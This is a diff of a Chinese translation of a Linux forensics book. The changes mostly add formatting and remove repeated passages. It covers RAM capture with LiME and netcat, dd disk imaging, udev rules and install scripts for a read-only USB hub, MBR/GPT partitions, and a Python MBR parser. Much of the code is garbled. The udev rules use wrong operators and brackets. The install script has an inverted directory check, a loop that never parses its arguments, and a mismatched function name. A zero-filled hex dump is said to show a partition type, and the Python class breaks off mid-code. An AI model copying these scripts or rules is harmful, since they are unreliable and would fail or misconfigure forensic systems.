+运行 `lime` 的通用格式为 `sudo insmod lime.ko "path=<path> format=<format>"`。此命令安装（或插入）内核模块。由于明显的原因，此命令需要 root 权限。注意我给 `LIME` 的参数加了引号。这是你在大多数 Linux 版本中需要的操作。如果这对你无效，请尝试去掉引号。
 
-要转储 RAM，将正确的 LiME 模块复制到你的响应驱动器或其他介质（永远不要用目标硬盘！）。在目标机器上执行 `sudo insmod <kernel version>.ko "path=tcp:<port number> format=lime"` 以设置监听器，它将 RAM 转储给任何连接它的人。注意 LiME 支持 UDP 等其他协议，但我建议你坚持使用 TCP。在安装 LiME 之前运行 `uname -a` 不是个坏主意，可以双检确保使用的是正确的内核版本。在目标系统上安装 LiME 的命令如图 3.13 所示。
+要转储 RAM，将正确的 `LiME` 模块复制到你的响应驱动器或其他介质（永远不要用目标硬盘！）。在目标机器上执行 `sudo insmod <kernel version>.ko "path=tcp:<port number> format=lime"` 以设置监听器，它将 RAM 转储给任何连接它的人。注意 `LiME` 支持 UDP 等其他协议，但我建议你坚持使用 TCP。在安装 `LiME` 之前运行 `uname -a` 不是个坏主意，可以双检确保使用的是正确的内核版本。在目标系统上安装 `LiME` 的命令如图 3.13 所示。
 
 ![](img/7abfab28a493757db3f096946a95ec01_95_0.png)
 
 图 3.13
-在目标系统上安装 LiME。注意在安装 LiME 之前已运行 `uname -a`，以提醒调查人员应该使用哪个版本的 LiME。
+在目标系统上安装 `LiME`。注意在安装 `LiME` 之前已运行 `uname -a`，以提醒调查人员应该使用哪个版本的 `LiME`。
 
-在取证工作站上运行 `nc {subject IP} {port used by LiME} > {filename}`，即 `nc 192.168.56.101 8888 > ram.lime`，将连接到 LiME 监听器并通过网络发送 RAM 转储。一旦转储完成，LiME 将从目标系统上卸载模块。接收到的 RAM 转储的开头如图 3.14 所示。注意文件头是“EMil”，即 LiME 的倒写。
+在取证工作站上运行 `nc {subject IP} {port used by LiME} > {filename}`，即 `nc 192.168.56.101 8888 > ram.lime`，将连接到 `LiME` 监听器并通过网络发送 RAM 转储。一旦转储完成，`LiME` 将从目标系统上卸载模块。接收到的 RAM 转储的开头如图 3.14 所示。注意文件头是“EMil”，即 `LiME` 的倒写。
 
 ![](img/7abfab28a493757db3f096946a95ec01_96_0.png)
 
 图 3.14
-LiME 格式的 RAM 转储文件。注意头部为 "EMIL" 或 LiME 的倒写。
+`LiME` 格式的 RAM 转储文件。注意头部为 "EMIL" 或 `LiME` 的倒写。
 
 ### 总结
 
@@ -2014,9 +2174,7 @@ LiME 格式的 RAM 转储文件。注意头部为 "EMIL" 或 LiME 的倒写。
 
 这种方法最大的优点是恶意软件没有机会反应。鉴于你在现场分析期间运行脚本收集的信息以及你转储的内存镜像，拔掉插头不太可能丢失太多信息。如果你怀疑有恶意软件感染，在大多数情况下这是你的最佳选择。
 
-
-
-（等）。原始镜像（raw image）无非是一个大文件，其中前 512 字节是 LBA0，接下来的 512 字节是 LBA1，依此类推。
+原始镜像（raw image）无非是一个大文件，其中前 512 字节是 LBA0，接下来的 512 字节是 LBA1，依此类推。
 
 由于原始格式在本质上与存储在介质上的内容完全相同，因此有许多标准工具可以对其进行操作。由于由于原因以及其他原因，原始格式非常流行，并受到了每种取证工具的支持。由于原始镜像的大小与它们代表的介质大小相同，因此它们通常非常大。
 
@@ -2024,9 +2182,9 @@ LiME 格式的 RAM 转储文件。注意头部为 "EMIL" 或 LiME 的倒写。
 
 ### 嵌入元数据的私有格式
 
-EnCase 是一种被广泛使用的专有取证工具。它在关注 Windows 系统的调查员中尤为流行。EnCase 文件格式由头部（header）、每 32 字节（64 扇区）带有校验和的原始扇区以及尾部（footer）组成。头部包含调查员、获取日期等元数据，并以校验和结束。尾部包含介质镜像的 MD5 校验和。
+`EnCase` 是一种被广泛使用的专有取证工具。它在关注 Windows 系统的调查员中尤为流行。`EnCase` 文件格式由头部（header）、每 32 字节（64 扇区）带有校验和的原始扇区以及尾部（footer）组成。头部包含调查员、获取日期等元数据，并以校验和结束。尾部包含介质镜像的 MD5 校验和。
 
-EnCase 文件格式支持压缩。压缩是在块级进行的，这使得搜索比其他情况下更快。此的原因是，大多数搜索是针对特定类型的文件进行的，而块（扇区）起始的文件头被用于确定文件类型。
+`EnCase` 文件格式支持压缩。压缩是在块级进行的，这使得搜索比其他情况下更快。此的原因是，大多数搜索是针对特定类型的文件进行的，而块（扇区）起始的文件头被用于确定文件类型。
 
 ## 元数据存储在独立文件中私有格式
 
@@ -2042,40 +2200,15 @@ EnCase 文件格式支持压缩。压缩是在块级进行的，这使得搜索�
 
 ### 使用 DD
 
-所有的 Linux 系统都带有一个名为 dd 的位移动程序。该实用程序比 Linux 早了几年。它最初的用途是用于在 ASCII（美国标准信息交换符号代码）和 EBCDIC（扩展二进制编码数字交换）之间转换。对于不熟悉 EBCDIC 的人来说，它是一种主要由 IBM 主机使用的编码方式。
+所有的 Linux 系统都带有一个名为 `dd` 的位移动程序。该实用程序比 Linux 早了几年。它最初的用途是用于在 ASCII（美国标准信息交换符号代码）和 EBCDIC（扩展二进制编码数字交换）之间转换。对于不熟悉 EBCDIC 的人来说，它是一种主要由 IBM 主机使用的编码方式。
 
-除了转换能力外，dd 还用于将数据从一个地方推送到另一个地方。数据以块的形式复制，默认块大小为 512 字节。dd 最基本的用法是 `dd if=<input file> of=<output file> bs=<block size>`。在 Linux 中，万物皆文件，如果输入文件代表一个设备，则输出文件将是一个原始镜像。
+除了转换能力外，`dd` 还用于将数据从一个地方推送到另一个地方。数据以块的形式复制，默认块大小为 512 字节。`dd` 最基本的用法是 `dd if=<input file> of=<output file> bs=<block size>`。在 Linux 中，万物皆文件，如果输入文件代表一个设备，则输出文件将是一个原始镜像。
 
-例如，`dd if=/dev/sda of=sda.img bs=512` 可以创建系统上第一个驱动器的原始镜像。我指出，你也可以通过对应于单个分区的设备文件（如 /dev/sda1、dev/sdb2 等）分别对分区进行镜像。我建议你将整个磁盘作为一个单元进行镜像。
-
-### 块大小是否有影响？
-
-在工作时，定期重新计算哈希值是一个好主意，以验证你没有更改镜像。如果镜像很大，与对小块进行哈希处理相比，计算整体哈希值可能非常耗时。其次，你可能会遇到损坏的介质。某些区域每次读取的结果可能不同。如果哈希值不匹配，丢弃这些受损区域的数据比丢弃整个磁盘镜像要好得多。通常，本章将讨论的某些工具会为你完成这些哈希计算工作。
-
-在一个完美的世界里，你只需要创建一个磁盘镜像并为整个镜像计算一个哈希值，然后就结束了。然而，我们并不生活在一个完美的世界里。因此，我建议你在计算整体哈希值的同时，也对对镜像的分块进行哈希处理。
-
-给出这一建议有几个原因。首先，在工作时定期重新计算哈希值是一个好主意，以验证你没有更改镜像。如果镜像很大，与对小块进行哈希处理相比，计算整体哈希值可能非常耗时。其次，你可能会遇到损坏的介质。某些区域每次读取的结果可能不同。如果哈希值不匹配，丢弃这些受损区域的数据比丢弃整个磁盘镜像要好得多。通常，本章将讨论的某些工具会为你完成这些哈希计算工作。
-
-使用 DD
-
-所有的 Linux 系统都带有一个名为 dd 的位移动程序。该实用程序比 Linux 早了几年。它最初的用途是用于在 ASCII（美国标准信息交换符号代码）和 EBCDIC（扩展二进制编码数字交换）之间转换。对于不熟悉 EBCDIC 的人来说，它是一种主要由 IBM 主机使用的编码方式。
-
-除了转换能力外，dd 还用于将数据从一个地方推送到另一个地方。数据以块的形式复制，默认块大小为 512 字节。dd 最基本的用法是 `dd if=<input file> of=<output file> bs=<block size>`。在 Linux 中，万物皆文件，如果输入文件代表一个设备，则输出文件将是一个原始镜像。
-
-例如，`dd if=/dev/sda of=sda.img bs=512` 可以创建系统上第一个驱动器的原始镜像。我指出，你也可以通过对应于单个分区的设备文件（如 /dev/sda1、dev/sdb2 等）分别对分区进行镜像。我建议你将整个磁盘作为一个单元进行镜像。
+例如，`dd if=/dev/sda of=sda.img bs=512` 可以创建系统上第一个驱动器的原始镜像。我指出，你也可以通过对应于单个分区的设备文件（如 `/dev/sda1`、`dev/sdb2` 等）分别对分区进行镜像。我建议你将整个磁盘作为一个单元进行镜像。
 
 ### 块大小是否有影响？
 
 在工作时，定期重新计算哈希值是一个好主意，以验证你没有更改镜像。如果镜像很大，与对小块进行哈希处理相比，计算整体哈希值可能非常耗时。其次，你可能会遇到损坏的介质。某些区域每次读取的结果可能不同。如果哈希值不匹配，丢弃这些受损区域的数据比丢弃整个磁盘镜像要好得多。通常，本章将讨论的某些工具会为你完成这些哈希计算工作。
-
-在一个完美的世界里，你只需要创建一个磁盘镜像并为整个镜像计算一个哈希值，然后就结束了。然而，我们并不生活在一个完美的世界里。因此，我建议你在计算整体哈希值的同时，也对镜像的分块进行哈希处理。
-
-（注：由于提供的文本中存在大量重复段落，以上翻译已按逻辑结构整合，并确保不重复输出原文且涵盖了所有唯一内容。） 
-
-
-
-
-对于大型媒体设备来说，并非如此，因为它受限于 USB 2.0 全速（12 Mbps）。我可能会在某会将此代码移植到能够实现更高速度（至少 480 Mbps）的新微控制器，但目前我推荐本章稍后描述的 Udev 方法。
 
 ### 软件写保护
 
@@ -2085,39 +2218,57 @@ EnCase 文件格式支持压缩。压缩是在块级进行的，这使得搜索�
 
 ### Udev 规则
 
-Udev 规则是 Linux 系统上控制设备处理的新方式。通过使用下面提供的 udev 规则，可以创建一个“魔法 USB 集线器”，它可以根据我们的规则自动挂载从主流连接的任何块设备。
+`Udev` 规则是 Linux 系统上控制设备处理的新方式。通过使用下面提供的 `udev` 规则，可以创建一个“魔法 USB 集线器”，它可以根据我们的规则自动挂载从主流连接的任何块设备。
 
-Linux 自带了一套标准的 udev 规则。管理员可以通过向 `/etc/udev/rules.d` 目录添加自己的规则来定制系统。像许多系统脚本（即启动脚本）一样，这些规则的执行顺序是由文件名决定的。标准做法是以数字开头文件名，以决定其加载时机。
+Linux 自带了一套标准的 `udev` 规则。管理员可以通过向 `/etc/udev/rules.d` 目录添加自己的规则来定制系统。像许多系统脚本（即启动脚本）一样，这些规则的执行顺序是由文件名决定的。标准做法是以数字开头文件名，以决定其加载时机。
 
 当运行下方文件中的规则时，挂载文件系统所需的所有信息尚不可用。因此，规则分两个阶段生成所有其他脚本。该文件应命名为 `/etc/udev/rules.d/10-protectedmount.rules`。注意，供应商和产品标识符将通过安装脚本设置以匹配你的设备。该安装脚本将在本章稍后介绍。
+
+```
+```
+
+
+
+# udev 规则示例
 
 ```
 ACTION="add", SUBSYSTEM="block", KERNEL="sd[1-9]", ATTRS(idVendor)="1a40",
 ATTR(idProduct)="0101", ENV(PHIL_MOUNT)="1", ENV(PHIL_DEV)="%k",
 RUN=/etc/udev/scripts/protromount.sh %k %"
+
 ACTION="remove", SUBSYSTEM="block", KERNEL="sd?[1-9]",
 ATTR(idVendor)="1a40", ATTRS(idProduct)="0101", ENV(PHIL_UNMOUNT)="1",
 RUN=/etc/udev/scripts/protromount.sh %k %"
+
 ENV(PHIL_MOUNT)="1", ENV(UDEVIS_AUTOMOUNT_HINT)="never", RUN=/etc/udev/scripts/protromount2-%n.sh"
+
 ENV(PHIL_MOUNT)="1", ENV(UDEVIS_PRESENTATION_HINT)="0",
 ENV(UDEVIS_AUTOMOUNT_HINT)="always"
+
 ENV(PHIL_UNMOUNT)="1", RUN=/etc/udev/scripts/protromount4-%n.sh"
 ```
 
-udev 规则的一般格式是用逗号分隔的一系列语句。第一个语句（即带有双等号 "===" 的语句）是匹配语句。如果所有这些语句都匹配，则执行剩余的语句。这些语句主要设置环境变量并将脚本添加到待执行列表中。任何此类脚本都应该快速运行，以避免拖慢系统。
+## 规则说明
+
+`udev` 规则的一般格式是用逗号分隔的一系列语句。第一个语句（即带有双等号 `"==="` 的语句）是匹配语句。如果所有这些语句都匹配，则执行剩余的语句。这些语句主要设置环境变量并将脚本添加到待执行列表中。任何此类脚本都应该快速运行，以避免拖慢系统。
 
 第一条规则可以分为匹配语句和针对设备的语句。匹配语句是 `ACTION="add", SUBS="block", KERNEL="sd?[1-9]", ATTRS{idVendor}="1a40", ATTRS{idProduct}="0101"`。当添加新设备时；它是一个块设备；它的名称为 `/dev/sdx`（其中 X 是字母，n 是分区号），或者其父级设备的 USB 供应商和分区 ID 匹配。如果你只想匹配设备的属性而不是父级设备的属性，请使用 `ATTR [attributeName]` 而不是 `ATTRS{attributeName}`。通过使用 `ATTRS`，我们确保该规则将与连接到集线器的每个设备匹配。第一条规则中包含运行设备命令的部分是 `ENV{PHIL_MOUNT}1", ENV{PHIL_DEV}="%k", RUN+=/etc/udev/scripts/protmount.sh %k %"`。这些语句将环境变量 `PHIL_MOUNT` 设置为 1，为内核名称设置另一个环境变量 `PHIL_DEV`，并将 `/etc/udev/scripts/protmount.sh` 添加到运行列表，以内核名称和分区号作为参数。
 
 第二条规则与第一条非常相似，但它是在设备移除时匹配的。它设置环境变量 `PHIL_UNMOUNT` 为 1，并将 `/etc/udev/scripts/protmount.sh` 添加到运行列表（再次以内核名称和分区号作为参数）。`protmount3.sh` 和 `protmount4.sh` 在设备移除后清理。
 
-下一条规则 `ENV{PHIL_MOUNT}1", ENV{UDIS_AUTOMOUNT_HINT="never", RUN+=/etc/udev/scripts/protmount2.sh}` 在操作系统尝试挂载文件系统之前运行。如果 `PHIL_MOUNT` 变量设置为 1，我们告诉操作系统处理显示的设备并自动挂载文件系统（因为它将只读挂载），并将 `protmount2.sh` 添加到执行列表。如果 `PHIL_MOUNT` 未设置为 1，则让操作系统以标准方式处理设备。最后一条规则在 `PHIL_UNMOUNT` 变量被设置时导致 `protmount4.sh` 。
+下一条规则 `ENV{PHIL_MOUNT}1", ENV{UDIS_AUTOMOUNT_HINT="never", RUN+=/etc/udev/scripts/protmount2.sh}` 在操作系统尝试挂载文件系统之前运行。如果 `PHIL_MOUNT` 变量设置为 1，我们告诉操作系统处理显示的设备并自动挂载文件系统（因为它将只读挂载），并将 `protmount2.sh` 添加到执行列表。如果 `PHIL_MOUNT` 未设置为 1，则让操作系统以标准方式处理设备。最后一条规则在 `PHIL_UNMOUNT` 变量被设置时导致 `protmount4.sh`。
+
+## 脚本说明
 
 现在我们转向脚本。`protmount2.sh` 和 `protmount3.sh` 脚本分别用于创建 `protmount2.sh` 和 `protmount4.sh`。如前所述，原因是挂载和卸载文件系统所需的信息并非同时可用。`protmount.sh` 如下：
 
 ```
 #!/bin/bash
+
 echo "!/bin/bash" >> /etc/udev/scripts/protmount2.sh
+
 echo "mkdir /media/$1" >> /etc/udev/scripts/protmount2.sh
+
 echo "chmod 777 /media/$1" >> /etc/udev/scripts/protmount2.sh
 ```
 
@@ -2125,9 +2276,13 @@ echo "chmod 777 /media/$1" >> /etc/udev/scripts/protmount2.sh
 
 ```bash
 #!/bin/bash
+
 echo "!/bin/bash" >> /etc/udev/scripts/protmount4.sh
+
 echo "mount /dev/$1" >> /etc/udev/scripts/protmount4.sh
+
 echo "rm /media/$1" >> /etc/udev/scripts/protmount4.sh
+
 echo "chmod +x" /etc/udev/scripts/protmount4.sh
 ```
 
@@ -2135,7 +2290,9 @@ echo "chmod +x" /etc/udev/scripts/protmount4.sh
 
 ```bash
 #!/bin/bash
+
 # "The Deck" 的安装脚本
+
 # 此脚本将安装 udev 规则，将 USB 集线器
 # 转换为魔法集线器。连接到魔法集线器的每个块设备
 # 将以只读方式自动挂载到 /media 目录下。
@@ -2143,11 +2300,11 @@ echo "chmod +x" /etc/udev/scripts/protmount4.sh
 # 现代 Linux 发行版。此软件按现状提供，
 # 不提供任何形式或暗示的保证。风险自担。
 # 作者不对使用此软件引起的任何问题负责。
-
 # 初始版本由 Phil Polstra 博士于 2012 年 8 月创建
 # 版本 1.1 于 2015 年 3 月创建
 # 新版本增加了对第二个 PID 的支持，这在使用
 # USB 3.0 集线器时是需要的，因为它们实际上显示为两个集线器
+
 unset VID
 unset PID
 unset PID2
@@ -2157,59 +2314,86 @@ unset PID2
 function usage {
 echo "usage: sudo ${basename $0} -vid 05e3 -pid 0608 [-pid2 0610]"
 Bugs email: "DrPhil at polstra.org"
-
 必需参数:
 -vid <USB 集线器的供应商 ID>
 -pid <USB 集线器的产品 ID>
-
 可选参数:
 -pid2 <USB 3.0 集线器的第二个产品 ID>
-
 EOF
 exit
+}
 function createRule {
 cat > /etc/udev/rules.d/10-protected.rules <<EOF
 ACTION="add", SUBSYSTEM="block", KERNEL="sd[1-9]",
 ATTRS(idvendor)=\${VID}", ATTRS(idProduct)=\${PID}", ENV(PHIL_MOUNT)="1",
 ENV(PHIL_DEV)="%k", RUN+=/etc/udev/scripts/protmount.sh k %n
+
 ACTION="remove", SUBSYSTEM="block", KERNEL="sd[1-9]",
 ATTRS(idvendor)=\${VID}", ATTRS(idProduct)=\${PID}", ENV(PHIL_UNMOUNT)="1",
 RUN+=/etc/udev/scripts/protmount3.sh k %n
+
 ENV(PHIL_MOUNT)="1", ENV(UDEIS_PRESENTATION_HINT)="1",
 ENV(UDIS_AUTOMOUNT_HINT)="never", RUN+=/etc/udev/scripts/protmount2-n.sh
+
 ENV(PHIL_MOUNT)="1", ENV(UDEIS_PRESENTATION_HINT)="0",
 ENV(UDEIS_AUTOMOUNT_HINT)="always"
+
 ENV(PHIL_MOUNT)="1", RUN+=/etc/udev/scripts/protmount4-n.sh
 EOF
 if [ "$PID2" = "" ]; then
-cat >> /etc/udev/rules.d/10-protected.rules <<EOF
-ACTION="add", SUBSYSTEM="block", KERNEL="sd[1-9]",
-ATTRS(idvendor)=\${VID}", ATTRS(idProduct)=\${PID}", ENV(PHIL_MOUNT)="1",
-ENV(PHIL_DEV)="%k", RUN+=/etc/udev/scripts/protmount.sh k %n
-ACTION="remove", SUBSYSTEM="block", KERNEL="sd[1-9]",
-ATTRS(idvendor)=\${VID}", ATTRS(idProduct)=\${PID}", ENV(PHIL_UNMOUNT)="1",
-RUN+=/etc/udev/scripts/protmount3.sh k %n
-ENV(PHIL_MOUNT)="1", ENV(UDEIS_PRESENTATION_HINT)="1",
-ENV(UDIS_AUTOMOUNT_HINT)="never", RUN+=/etc/udev/scripts/protmount2-n.sh
-ENV(PHIL_MOUNT)="1", ENV(UDEIS_PRESENTATION_HINT)="0",
-ENV(UDEIS_AUTOMOUNT_HINT)="always"
-ENV(PHIL_MOUNT)="1", RUN+=/etc/udev/scripts/protmount4-n.sh
-EOF
-fi
-fi
-function copyCopies {
-if [ -d "/etc/udev/scripts" ]; then
 ```
 
 
 
 
 ```bash
+cat >> /etc/udev/rules.d/10-protected.rules <<EOF
+
+ACTION="add", SUBSYSTEM="block", KERNEL="sd[1-9]",
+
+ATTRS(idvendor)=\${VID}", ATTRS(idProduct)=\${PID}", ENV(PHIL_MOUNT)="1",
+
+ENV(PHIL_DEV)="%k", RUN+=/etc/udev/scripts/protmount.sh k %n
+
+ACTION="remove", SUBSYSTEM="block", KERNEL="sd[1-9]",
+
+ATTRS(idvendor)=\${VID}", ATTRS(idProduct)=\${PID}", ENV(PHIL_UNMOUNT)="1",
+
+RUN+=/etc/udev/scripts/protmount3.sh k %n
+
+ENV(PHIL_MOUNT)="1", ENV(UDEIS_PRESENTATION_HINT)="1",
+
+ENV(UDIS_AUTOMOUNT_HINT)="never", RUN+=/etc/udev/scripts/protmount2-n.sh
+
+ENV(PHIL_MOUNT)="1", ENV(UDEIS_PRESENTATION_HINT)="0",
+
+ENV(UDEIS_AUTOMOUNT_HINT)="always"
+
+ENV(PHIL_MOUNT)="1", RUN+=/etc/udev/scripts/protmount4-n.sh
+
+EOF
+
+fi
+
+fi
+```
+
+```bash
+function copyCopies {
+if [ -d "/etc/udev/scripts" ]; then
+```
+
+```bash
 mkdir /etc/udev/scripts
 fi
+
 cp ./protmount*.sh /etc/udev/scripts/.
 }
-# parse commandline options
+```
+
+### parse commandline options
+
+```bash
 while [ -z "$1" ]; do
   case $1 in
     -h|--help)
@@ -2227,10 +2411,16 @@ while [ -z "$1" ]; do
   esac
   shift # consume command line arguments 1 at a time
 done
-# now actually do something
+```
+
+### now actually do something
+
+```bash
 createRule
 copyScripts
 ```
+
+
 
 该脚本非常直观。它以常见的 she-bang 开始，然后取消了几个环境变量。我们使用了一个典型的用法函数（usage function），然后定义了几个创建和拷贝文件的函数。最后，这些函数在脚本末尾运行。
 
@@ -2336,10 +2526,6 @@ MBR 中的每个分区项包含表 5.2 所示的信息。
 
 扩展分区 MBR 中分区项的地址相对于扩展分区的起始位置（毕竟它是自己的逻辑驱动器）。扩展分区中的逻辑分区也可以扩展。换句话说，扩展分区可以嵌套，从而允许创建八个以上的分区。在嵌套扩展分区的情况下，最后一个分区由该扩展分区 MBR 第二个槽位中的空项来指示。嵌套扩展分区如图 5.2 所示。
 
-
-
-
-
 ![](img/7abfab28a493757db3f096946a95ec01_117_0.png)
 
 图 5.2
@@ -2386,9 +2572,6 @@ GPT 头文件格式如表 5.3 所示。在尝试挂载使用 GUID 分区的驱�
 
 每个条目的格式如表 5.4 所示。这些条目中属性字段的格式如表 5.5 所示。与用一个字节指示分区类型的 MBR 分区不同，基于 GPT 的分区具有 16 字节的 GUID。
 
-
-
-
 通过将它们包含在 $) 中执行，你可以通过将数学运算包含在 ($ 中在命令行中进行数学计算。
 
 使用我们的 bash shell 技巧，正确的命令是 `sudo mount -o ro,noatime,loop,offset=$((starting_sector * 512 )) <image_file=<mount point directory>`。从图 5.4 挂载镜像的一系列命令如图 5.5 所示。
@@ -2399,59 +2582,95 @@ GPT 头文件格式如表 5.3 所示。在尝试挂载使用 GUID 分区的驱�
 
 从扩展分区中挂载单个分区。
 
-如果你的镜像包含扩展分区怎么办？步骤完全相同。带有扩展分区的镜像如图 5.6 所示。请注意，fdisk 会将扩展分区内部的相对扇区地址转换为整个镜像中的绝对地址。同样注意的是，扩展分区内的交换分区从分区的第二个扇区开始。第一个扇区被扩展分区的 mini-MBR 使用，第二个扇区只是填充，以确保交换分区在偶数扇区上开始。
+如果你的镜像包含扩展分区怎么办？步骤完全相同。带有扩展分区的镜像如图 5.6 所示。请注意，`fdisk` 会将扩展分区内部的相对扇区地址转换为整个镜像中的绝对地址。同样注意的是，扩展分区内的交换分区从分区的第二个扇区开始。第一个扇区被扩展分区的 mini-MBR 使用，第二个扇区只是填充，以确保交换分区在偶数扇区上开始。
 
-图 5.6 镜像中扩展分区的 mini-MBR 如图 5.7 所示。图中突出了分区类型 0x82。回想起 Linux 交换分区的类型代码。注意第二个 MBR 条目是空白的，表示该分区内部没有嵌套扩展分区。使用 `dd` 命令生成了此图。
+图 5.6 镜像中扩展分区的 mini-MBR 如图 5.7 所示。图中突出了分区类型 `0x82`。回想起 Linux 交换分区的类型代码。注意第二个 MBR 条目是空白的，表示该分区内部没有嵌套扩展分区。使用 `dd` 命令生成了此图。
 
-```
-dd if=/dev/sdb count=1 bs=512 skip=22 of=output.bin
+
+
+`dd if=/dev/sdb count=1 bs=512 skip=22 of=output.bin`
+
 total bytes: 512 (0.50 KB), 512 bytes/s,1.00 MB/s
 
 1+0 records of 512 B/512 B, 512 bytes copied,1. 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 
 FIGURE 5.6
 
 一个带有扩展分区的镜像。
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
-```
 
 FIGURE 5.7
 
-扩展分区的 mini-MBR。高亮字节是分区类型 0x82，表示这是一个交换分区。注意第二个条目是空白的，表示该分区下没有嵌套的扩展分区。
+扩展分区的 mini-MBR。高亮字节是分区类型 `0x82`，表示这是一个交换分区。注意第二个条目是空白的，表示该分区下没有嵌套的扩展分区。
 
 从镜像中快速查看单个扇区的方法是执行命令 `dd skip=<sector number> bs=<sector size> count=1 if=<image file> xxd`。生成图 5.7 的命令是 `dd skip=33556478 bs=512 count=1 if=pentester-academy-subject1-flat.vmdk xxd`。重要的是，`dd` 使用块（默认块大小为512），而 `mount` 使用的是不同的方式。这就是为什么我们使用 `dd` 时不需要进行任何数学计算。
 
@@ -2463,20 +2682,16 @@ FIGURE 5.8
 
 从命令行挂载镜像中的 Linux 分区。
 
-如果你的目标系统使用 GUID 分区表 (GPT) 呢？对这类系统运行 `fdisk` 的结果如图 5.9 所示。显示的唯一分区覆盖了整个磁盘，类型为 0xEE。这就是本章前面讨论的保护性 MBR。注意 `fdisk` 显示了一个警告，包含了为 GPT 驱动器运行的正确工具。
+如果你的目标系统使用 GUID 分区表 `GPT` 呢？对这类系统运行 `fdisk` 的结果如图 5.9 所示。显示的唯一分区覆盖了整个磁盘，类型为 `0xEE`。这就是本章前面讨论的保护性 MBR。注意 `fdisk` 显示了一个警告，包含了为 GPT 驱动器运行的正确工具。
 
 运行 `fdisk -l /dev/sda`
 WARNING: GPT partition table detected! fdisk supports GPT.
 
 设备显示的逻辑大小小于物理扇区大小。与扇区对齐是可选的，但建议这样做。
 
-
-
-
-
 # 它有什么用？
 
-### 脚本语言或编程语言
+## 脚本语言或编程语言
 
 在本书中，你会看到我将 Python 称为一种脚本语言。有些人可能会认为它是一门编程语言。哪种说法正确？两者都是正确的。在我看来，脚本语言是一种允许你快速开展工作的解释型语言。Python 确实满足这些标准。
 
@@ -2484,7 +2699,7 @@ WARNING: GPT partition table detected! fdisk supports GPT.
 
 你可能会问我们为什么要切换到 Python。这是一个很好的问题。使用 Python 来完成这项任务有几个原因。首先，我们不再仅仅是运行程序和来回处理。相反，我们正在读取文件、解释它们、执行计算，然后运行程序。其次，我们正寻求构建一个代码库，供我们的调查中使用。拥有可以解析 MBR 和 GPT 数据的 Python 代码，在未来可能会非常有用。
 
-### 基于 MBR 的主分区
+## 基于 MBR 的主分区
 
 我们将从最简单的情况开始，即基于 MBR 驱动的主分区。为了简单起见，我将挂载代码分成了三个脚本。如果你愿意，可以随时将它们合并。毕竟它是开源的。以下脚本将挂载来自基于 MBR 的镜像文件的主分区。
 
@@ -2504,11 +2719,11 @@ import subprocess
 import struct
 ```
 
-MbrRecord: 从主引导记录 (MBR) 中解码分区记录
-用法: rec = MbrRecord(sector, partno) 其中
-sector 是包含 MBR 的 512 字节或更大的扇
-partno 是感兴趣的分区编号 0-3
-rec.printPart() 打印分区信息
+MbrRecord: 从主引导记录 `MBR` 中解码分区记录
+用法: `rec = MbrRecord(sector, partno)` 其中
+`sector` 是包含 MBR 的 512 字节或更大的扇
+`partno` 是感兴趣的分区编号 0-3
+`rec.printPart()` 打印分区信息
 
 ```python
 class MbrRecord():
@@ -2519,72 +2734,136 @@ class MbrRecord():
         self.active = False
         # 第一个字节 == 0x80 表示激活（可启动）
         if sector[offset] == '\x80':
-            self.active = True
-            self.type = ord(sector[offset+4])
-        self.empty = False
-        # 分区类型 == 0
-        if self.type == 0:
-            self.empty = True
-        # 扇区值为 32 位，并以小端序格式存储
-        self.start = struct.unpack('<I', sector[offset + 8: \
-            offset + 12])[0]
-        self.sectors = struct.unpack('<I', sector[offset + 12: \
-            offset + 16])[0]
-    def printPart(self):
-        if self.empty == True:
-            print("<empty>")
-        else:
-            outstr = ""
-            if self.active == True:
-                outstr += "Bootable:"
-            outstr += "Type " + str(self.type) + " :"
-            outstr += "Start " + str(self.start) + " :"
-            outstr += "Total sectors " + str(self.sectors)
-            print(outstr)
+```
+
+
+
+```python
+self.active = True
+
+self.type = ord(sector[offset+4])
+
+self.empty = False
+
+# 分区类型 == 0
+
+if self.type == 0:
+
+    self.empty = True
+
+# 扇区值为 32 位，并以小端序格式存储
+
+self.start = struct.unpack('<I', sector[offset + 8: \
+    offset + 12])[0]
+
+self.sectors = struct.unpack('<I', sector[offset + 12: \
